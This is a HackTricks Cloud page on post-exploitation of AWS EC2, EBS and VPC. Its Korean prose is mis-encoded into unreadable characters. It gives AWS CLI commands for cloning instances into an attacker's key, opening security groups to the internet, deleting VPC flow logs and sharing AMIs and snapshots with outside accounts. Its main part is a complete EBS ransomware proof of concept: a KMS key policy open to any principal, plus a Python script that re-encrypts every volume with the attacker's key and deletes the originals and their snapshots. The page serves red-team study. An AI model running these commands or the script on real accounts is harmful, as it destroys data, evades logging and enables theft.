# AWS - EC2, EBS, SSM & VPC Post Exploitation

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## EC2 & VPC

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **ì•…ì˜ì ì¸ VPC ë¯¸ëŸ¬ -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC íŠ¸ë˜í”½ ë¯¸ëŸ¬ë§ì€ **VPC ë‚´ì˜ EC2 ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ ìˆ˜ì‹  ë° ë°œì‹  íŠ¸ë˜í”½ì„ ë³µì œ**í•˜ë©°, ì¸ìŠ¤í„´ìŠ¤ ìì²´ì— ì•„ë¬´ê²ƒë„ ì„¤ì¹˜í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤. ì´ ë³µì œëœ íŠ¸ë˜í”½ì€ ì¼ë°˜ì ìœ¼ë¡œ ë¶„ì„ ë° ëª¨ë‹ˆí„°ë§ì„ ìœ„í•´ ë„¤íŠ¸ì›Œí¬ ì¹¨ì… íƒì§€ ì‹œìŠ¤í…œ(IDS)ê³¼ ê°™ì€ ê³³ìœ¼ë¡œ ì „ì†¡ë©ë‹ˆë‹¤.\
ê³µê²©ìëŠ” ì´ë¥¼ ì•…ìš©í•˜ì—¬ ëª¨ë“  íŠ¸ë˜í”½ì„ ìº¡ì²˜í•˜ê³  ë¯¼ê°í•œ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

ìì„¸í•œ ì •ë³´ëŠ” ì´ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### ì‹¤í–‰ ì¤‘ì¸ ì¸ìŠ¤í„´ìŠ¤ ë³µì‚¬

ì¸ìŠ¤í„´ìŠ¤ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì–´ë–¤ í˜•íƒœì˜ ë¯¼ê°í•œ ì •ë³´ë¥¼ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë‚´ë¶€ì— ì ‘ê·¼í•˜ëŠ” ë°©ë²•ì€ ì—¬ëŸ¬ ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤(ìì„¸í•œ ë‚´ìš©ì€ [EC2 ê¶Œí•œ ìƒìŠ¹ íŠ¸ë¦­](../../aws-privilege-escalation/aws-ec2-privesc.md) í™•ì¸). ê·¸ëŸ¬ë‚˜ í¬í•¨ëœ ë‚´ìš©ì„ í™•ì¸í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ **AMIë¥¼ ìƒì„±í•˜ê³  ì´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ìƒˆ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤(ìì‹ ì˜ ê³„ì •ì—ì„œë„ ê°€ëŠ¥)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS ìŠ¤ëƒ…ìƒ· ë¤í”„

**ìŠ¤ëƒ…ìƒ·ì€ ë³¼ë¥¨ì˜ ë°±ì—…**ìœ¼ë¡œ, ì¼ë°˜ì ìœ¼ë¡œ **ë¯¼ê°í•œ ì •ë³´**ë¥¼ í¬í•¨í•˜ê³  ìˆìœ¼ë¯€ë¡œ ì´ë¥¼ í™•ì¸í•˜ë©´ ì´ ì •ë³´ë¥¼ ê³µê°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
**ìŠ¤ëƒ…ìƒ·ì´ ì—†ëŠ” ë³¼ë¥¨**ì„ ì°¾ìœ¼ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: **ìŠ¤ëƒ…ìƒ· ìƒì„±** ë° ë‹¤ìŒ ì‘ì—… ìˆ˜í–‰ ë˜ëŠ” ê·¸ëƒ¥ **ì¸ìŠ¤í„´ìŠ¤ì— ë§ˆìš´íŠ¸**í•˜ê¸°:

{% content-ref url="aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### ë°ì´í„° ìœ ì¶œ

#### DNS ìœ ì¶œ

EC2ì˜ íŠ¸ë˜í”½ì„ ì°¨ë‹¨í•˜ë”ë¼ë„ ì—¬ì „íˆ **DNSë¥¼ í†µí•´ ìœ ì¶œ**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* **VPC íë¦„ ë¡œê·¸ëŠ” ì´ë¥¼ ê¸°ë¡í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
* AWS DNS ë¡œê·¸ì— ì ‘ê·¼í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
* ë‹¤ìŒê³¼ ê°™ì´ "enableDnsSupport"ë¥¼ falseë¡œ ì„¤ì •í•˜ì—¬ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### API í˜¸ì¶œì„ í†µí•œ ìœ ì¶œ

ê³µê²©ìëŠ” ìì‹ ì´ ì œì–´í•˜ëŠ” ê³„ì •ì˜ API ì—”ë“œí¬ì¸íŠ¸ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Cloudtrailì€ ì´ í˜¸ì¶œì„ ê¸°ë¡í•˜ë©°, ê³µê²©ìëŠ” Cloudtrail ë¡œê·¸ì—ì„œ ìœ ì¶œëœ ë°ì´í„°ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì—´ë¦° ë³´ì•ˆ ê·¸ë£¹

ë‹¤ìŒê³¼ ê°™ì´ í¬íŠ¸ë¥¼ ì—´ì–´ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ì— ëŒ€í•œ ì¶”ê°€ ì•¡ì„¸ìŠ¤ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### ECSë¡œì˜ ê¶Œí•œ ìƒìŠ¹

EC2 ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‹¤í–‰í•˜ê³  ì´ë¥¼ ECS ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©í•˜ë„ë¡ ë“±ë¡í•œ ë‹¤ìŒ ECS ì¸ìŠ¤í„´ìŠ¤ì˜ ë°ì´í„°ë¥¼ í›”ì¹˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

[**ìì„¸í•œ ë‚´ìš©ì€ ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### VPC íë¦„ ë¡œê·¸ ì œê±°
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### AMI ê³µìœ 

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS ìŠ¤ëƒ…ìƒ· ê³µìœ 

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS ëœì„¬ì›¨ì–´ PoC

S3 í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì´í…Œì´ì…˜ ë…¸íŠ¸ì—ì„œ ì‹œì—°ëœ ëœì„¬ì›¨ì–´ ë°ëª¨ì™€ ìœ ì‚¬í•œ ê°œë… ì¦ëª…. KMSëŠ” ë‹¤ì–‘í•œ AWS ì„œë¹„ìŠ¤ë¥¼ ì•”í˜¸í™”í•˜ëŠ” ë° ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì–¼ë§ˆë‚˜ ì‰¬ìš´ì§€ë¥¼ ê³ ë ¤í•˜ì—¬ ëœì„¬ì›¨ì–´ ê´€ë¦¬ ì„œë¹„ìŠ¤(RMS)ë¡œ ì´ë¦„ì„ ë³€ê²½í•´ì•¼ í•©ë‹ˆë‹¤.

ë¨¼ì € 'ê³µê²©ì' AWS ê³„ì •ì—ì„œ KMSì— ê³ ê° ê´€ë¦¬ í‚¤ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì´ ì˜ˆì—ì„œëŠ” AWSê°€ í‚¤ ë°ì´í„°ë¥¼ ê´€ë¦¬í•˜ë„ë¡ í•˜ê² ì§€ë§Œ, í˜„ì‹¤ì ì¸ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì•…ì˜ì ì¸ í–‰ìœ„ìê°€ AWSì˜ í†µì œë¥¼ ë²—ì–´ë‚œ ê³³ì— í‚¤ ë°ì´í„°ë¥¼ ë³´ê´€í•  ê²ƒì…ë‹ˆë‹¤. í‚¤ ì •ì±…ì„ ë³€ê²½í•˜ì—¬ ëª¨ë“  AWS ê³„ì • ì£¼ì²´ê°€ í‚¤ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì´ í‚¤ ì •ì±…ì—ì„œ ê³„ì • ì´ë¦„ì€ 'AttackSim'ì´ë©°, ëª¨ë“  ì ‘ê·¼ì„ í—ˆìš©í•˜ëŠ” ì •ì±… ê·œì¹™ì€ 'Outside Encryption'ì´ë¼ê³  í•©ë‹ˆë‹¤.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

Now with the publicly accessible key to use. We can use a 'victim' account that has some EC2 instances spun up with unencrypted EBS volumes attached. This 'victim' account's EBS volumes are what we're targeting for encryption, this attack is under the assumed breach of a high-privilege AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 ëœì„¬ì›¨ì–´ ì˜ˆì œì™€ ìœ ì‚¬í•˜ê²Œ, ì´ ê³µê²©ì€ ìŠ¤ëƒ…ìƒ·ì„ ì‚¬ìš©í•˜ì—¬ ì—°ê²°ëœ EBS ë³¼ë¥¨ì˜ ë³µì‚¬ë³¸ì„ ìƒì„±í•˜ê³ , 'ê³µê²©ì' ê³„ì •ì˜ ê³µê°œì ìœ¼ë¡œ ì‚¬ìš© ê°€ëŠ¥í•œ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ EBS ë³¼ë¥¨ì„ ì•”í˜¸í™”í•œ ë‹¤ìŒ, ì›ë˜ EBS ë³¼ë¥¨ì„ EC2 ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ë¶„ë¦¬í•˜ê³  ì‚­ì œí•œ í›„, ìƒˆë¡œ ì•”í˜¸í™”ëœ EBS ë³¼ë¥¨ì„ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©ëœ ìŠ¤ëƒ…ìƒ·ì„ ì‚­ì œí•©ë‹ˆë‹¤. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

ì´ë¡œ ì¸í•´ ê³„ì •ì— ë‚¨ì•„ ìˆëŠ” ê²ƒì€ ì•”í˜¸í™”ëœ EBS ë³¼ë¥¨ë¿ì…ë‹ˆë‹¤.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

ë˜í•œ ì£¼ëª©í•  ì ì€, ìŠ¤í¬ë¦½íŠ¸ê°€ EC2 ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì¤‘ì§€ì‹œì¼œ ì›ë˜ EBS ë³¼ë¥¨ì„ ë¶„ë¦¬í•˜ê³  ì‚­ì œí–ˆë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ì›ë˜ì˜ ì•”í˜¸í™”ë˜ì§€ ì•Šì€ ë³¼ë¥¨ì€ ì´ì œ ì‚¬ë¼ì¡ŒìŠµë‹ˆë‹¤.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

ë‹¤ìŒìœ¼ë¡œ, 'ê³µê²©ì' ê³„ì •ì˜ í‚¤ ì •ì±…ìœ¼ë¡œ ëŒì•„ê°€ 'ì™¸ë¶€ ì•”í˜¸í™”' ì •ì±… ê·œì¹™ì„ í‚¤ ì •ì±…ì—ì„œ ì œê±°í•©ë‹ˆë‹¤.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
ì ì‹œ ê¸°ë‹¤ë ¤ ìƒˆë¡œ ì„¤ì •ëœ í‚¤ ì •ì±…ì´ ì „íŒŒë˜ê¸°ë¥¼ ê¸°ë‹¤ë¦¬ì‹­ì‹œì˜¤. ê·¸ëŸ° ë‹¤ìŒ 'í¬ìƒì' ê³„ì •ìœ¼ë¡œ ëŒì•„ê°€ ìƒˆë¡œ ì•”í˜¸í™”ëœ EBS ë³¼ë¥¨ ì¤‘ í•˜ë‚˜ë¥¼ ì—°ê²°í•´ ë³´ì‹­ì‹œì˜¤. ë³¼ë¥¨ì„ ì—°ê²°í•  ìˆ˜ ìˆìŒì„ ì•Œê²Œ ë  ê²ƒì…ë‹ˆë‹¤.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

í•˜ì§€ë§Œ ì•”í˜¸í™”ëœ EBS ë³¼ë¥¨ìœ¼ë¡œ EC2 ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‹¤ì œë¡œ ë‹¤ì‹œ ì‹œì‘í•˜ë ¤ê³  í•˜ë©´ 'ëŒ€ê¸° ì¤‘' ìƒíƒœì—ì„œ 'ì¤‘ì§€ë¨' ìƒíƒœë¡œ ì˜ì›íˆ ëŒì•„ê°€ë©´ì„œ ì‹¤íŒ¨í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ëŠ” ì—°ê²°ëœ EBS ë³¼ë¥¨ì´ í‚¤ ì •ì±…ì´ ë” ì´ìƒ í—ˆìš©í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³µí˜¸í™”í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

ì´ê²ƒì€ ì‚¬ìš©ëœ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤. 'í¬ìƒì' ê³„ì •ì˜ AWS ìê²© ì¦ëª…ê³¼ ì•”í˜¸í™”ì— ì‚¬ìš©ë  í‚¤ì˜ ê³µê°œì ìœ¼ë¡œ ì‚¬ìš© ê°€ëŠ¥í•œ AWS ARN ê°’ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ëŒ€ìƒ AWS ê³„ì •ì˜ ëª¨ë“  EC2 ì¸ìŠ¤í„´ìŠ¤ì— ì—°ê²°ëœ ëª¨ë“  EBS ë³¼ë¥¨ì˜ ì•”í˜¸í™”ëœ ë³µì‚¬ë³¸ì„ ë§Œë“¤ê³ , ëª¨ë“  EC2 ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì¤‘ì§€í•˜ê³ , ì›ë˜ EBS ë³¼ë¥¨ì„ ë¶„ë¦¬í•˜ê³ , ì‚­ì œí•œ ë‹¤ìŒ, í”„ë¡œì„¸ìŠ¤ ì¤‘ì— ì‚¬ìš©ëœ ëª¨ë“  ìŠ¤ëƒ…ìƒ·ì„ ì‚­ì œí•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ëŒ€ìƒ 'í¬ìƒì' ê³„ì •ì— ì•”í˜¸í™”ëœ EBS ë³¼ë¥¨ë§Œ ë‚¨ê²Œ ë©ë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” í…ŒìŠ¤íŠ¸ í™˜ê²½ì—ì„œë§Œ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤. íŒŒê´´ì ì´ë©° ëª¨ë“  ì›ë˜ EBS ë³¼ë¥¨ì„ ì‚­ì œí•©ë‹ˆë‹¤. ì‚¬ìš©ëœ KMS í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³µêµ¬í•˜ê³  ìŠ¤ëƒ…ìƒ·ì„ í†µí•´ ì›ë˜ ìƒíƒœë¡œ ë³µì›í•  ìˆ˜ ìˆì§€ë§Œ, ê²°êµ­ ì´ê²ƒì´ ëœì„¬ì›¨ì–´ PoCë¼ëŠ” ì ì„ ì¸ì‹í•˜ì‹œê¸° ë°”ëë‹ˆë‹¤.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
